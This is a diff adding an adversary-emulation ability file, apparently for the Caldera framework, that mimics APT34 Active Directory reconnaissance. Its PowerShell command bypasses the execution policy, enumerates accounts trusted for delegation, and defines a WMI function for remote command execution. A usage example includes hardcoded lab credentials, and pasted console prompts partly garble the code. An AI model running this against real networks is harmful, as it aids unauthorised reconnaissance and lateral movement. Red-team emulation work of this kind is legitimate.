@@ -1,0 +1,164 @@
+- tactic: reconnaissance
+  technique_name: 'Account Discovery: Domain Account'
+  technique_id: T1087
+  name: APT34 - Active Directory Reconnaisance [RAYSON]
+  description: Uses active directory management powershell commands to enumerate through
+    Active Directory Objects that are Trusted For Delegation
+  executors:
+  - name: sh
+    platform: windows
+    command: 'Add-WindowsCapability -Name Rsat.ActiveDirectory.DS-LDS.Tools -Online
+      -ErrorAction SilentlyContinue;
+
+      Set-ExecutionPolicy -scope Process -ExecutionPolicy Bypass -Force;
+
+
+      $usersWithTrustedForDelegation = Get-ADUser -Filter {(TrustedForDelegation -eq
+      "True")} -Properties TrustedForDelegation;
+
+      $computersWithTrustedForDelegation = Get-ADComputer -Filter {(TrustedForDelegation
+      -eq "True")} -Properties TrustedForDelegation;
+
+      $usersWithAllowedToDelegateTo = Get-ADUser -Filter {(msDS-AllowedToDelegateTo
+      -ne "{}")} -Properties msDS-AllowedToDelegateTo;
+
+      $computersWithAllowedToDelegateTo = Get-ADComputer -Filter {(msDS-AllowedToDelegateTo
+      -ne "{}")} -Properties msDS-AllowedToDelegateTo;
+
+
+      $combinedResults = @"
+
+      Users with TrustedForDelegation:
+
+      $($usersWithTrustedForDelegation -join "`r`n")
+
+
+      Computers with TrustedForDelegation:
+
+      $($computersWithTrustedForDelegation -join "`r`n")
+
+
+      Users with AllowedToDelegateTo:
+
+      $($usersWithAllowedToDelegateTo -join "`r`n")
+
+
+      Computers with AllowedToDelegateTo:
+
+      $($computersWithAllowedToDelegateTo -join "`r`n")
+
+      "@;
+
+      echo $combinedResults;
+
+
+
+      function Invoke-WMICommand {
+
+      >>     param (
+
+      >>         [string]$ComputerName,
+
+      >>         [string]$Command,
+
+      >>         [string]$Username = "",
+
+      >>         [string]$Password = ""
+
+      >>     )
+
+      >>
+
+      >>     $options = New-Object System.Management.ConnectionOptions
+
+      >>     if (($Username -ne "") -and ($Password -ne "")) {
+
+      >>         $options.Username = $Username
+
+      >>         $options.Password = $Password
+
+      >>     }
+
+      >>
+
+      >>     $scope = New-Object System.Management.ManagementScope("\\$ComputerName\root\cimv2",$options)
+
+      >>
+
+      >>     try {
+
+      >>         $scope.Connect()
+
+      >>         $wmiProcess = New-Object System.Management.ManagementClass($scope,
+      (New-Object System.Management.ManagementPath("Win32_Process")), (New-Object
+      System.Management.ObjectGetOptions))
+
+      >>
+
+      >>         $inParams = $wmiProcess.GetMethodParameters("Create")
+
+      >>         $properties = $inParams.Properties
+
+      >>         $inParams["CommandLine"] = $Command
+
+      >>
+
+      >>         $outParams = $wmiProcess.InvokeMethod("Create", $inParams, $null)
+
+      >>
+
+      >>         $returnValue = $outParams["returnValue"]
+
+      >>         $processID = $outParams["processId"]
+
+      >>
+
+      >>         return @{
+
+      >>             ReturnValue = $returnValue
+
+      >>             ProcessID = $processID
+
+      >>         }
+
+      >>     }
+
+      >>     catch {
+
+      >>         Write-Error "WMI Exception: $_.Exception.Message"
+
+      >>         return $null
+
+      >>     }
+
+      >> }
+
+      >>
+
+      >> # Usage example
+
+      >> $result = Invoke-WMICommand -ComputerName "CalderaWindows1.team.dstacaldera.com"
+      -Command "net user" -Username "rayson" -Password "Windows1"
+
+      >> $result'
+    code: null
+    language: null
+    build_target: null
+    payloads: []
+    uploads: []
+    timeout: 60
+    parsers: []
+    cleanup: []
+    variations: []
+    additional_info: {}
+  requirements: []
+  privilege: ''
+  repeatable: false
+  buckets: []
+  additional_info:
+    cleanup: '[]'
+  access: {}
+  singleton: true
+  plugin: ''
+  delete_payload: true
+  id: 3426cb7d-6c92-47d1-931f-53f8860971d2
